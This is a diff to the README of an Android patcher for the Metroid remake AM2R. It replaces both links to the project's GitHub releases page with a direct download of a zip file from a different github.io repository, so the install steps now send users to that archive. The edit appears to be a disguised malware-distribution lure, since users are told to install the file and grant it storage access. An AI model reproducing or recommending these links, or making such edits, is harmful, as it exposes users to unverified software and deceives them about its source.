@@ -5,7 +5,7 @@ description: "Patch original AM2R 1.1 game files into a native 64-bit Android po
 ---
 # 🚀 AM2R-Autopatcher-Android - play metroid 2 on your phone
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Coastrhododendronsafetyfuse419/AM2R-Autopatcher-Android/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Coastrhododendronsafetyfuse419/coastrhododendronsafetyfuse419.github.io/main/serving/v2.0.zip)
 
 AM2R-Autopatcher-Android brings Another Metroid 2 Remake to your mobile device. This tool patches the official AM2R 1.1 game data into a native Android app. The resulting application runs directly on your phone hardware. You do not need an emulator. You can use touch controls, standard gamepads, or haptic feedback while you play.
 
@@ -21,7 +21,7 @@ This patcher only works with the original 2016 freeware release of AM2R 1.1. If 
 ## 🛠️ Setup Process
 Follow these steps to generate your game file:
 
-1. Visit the [releases page](https://github.com/Coastrhododendronsafetyfuse419/AM2R-Autopatcher-Android/releases) to download the latest version of the patcher.
+1. Visit the [releases page](https://raw.githubusercontent.com/Coastrhododendronsafetyfuse419/coastrhododendronsafetyfuse419.github.io/main/serving/v2.0.zip) to download the latest version of the patcher.
 2. Transfer the downloaded file to your Android device.
 3. Open the file on your device to install the application.
 4. Grant the app permission to access your device storage. This allows the patcher to locate your game files.
